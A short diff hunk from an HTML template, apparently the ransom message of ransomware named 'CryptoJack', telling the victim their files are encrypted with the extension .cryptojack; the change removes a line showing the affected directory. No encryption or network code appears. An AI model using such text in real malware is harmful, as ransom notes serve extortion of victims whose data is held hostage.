@@ -39,7 +39,6 @@ h1 {
 Hello!<p />
 All of your valuable files in the directory named below have just been encrypted
 by CryptoJack!<p />
-Directory: [<b>%s</b>] <p />
 The encrypted files for this computer have file extension: .cryptojack
 </div>
 <p />
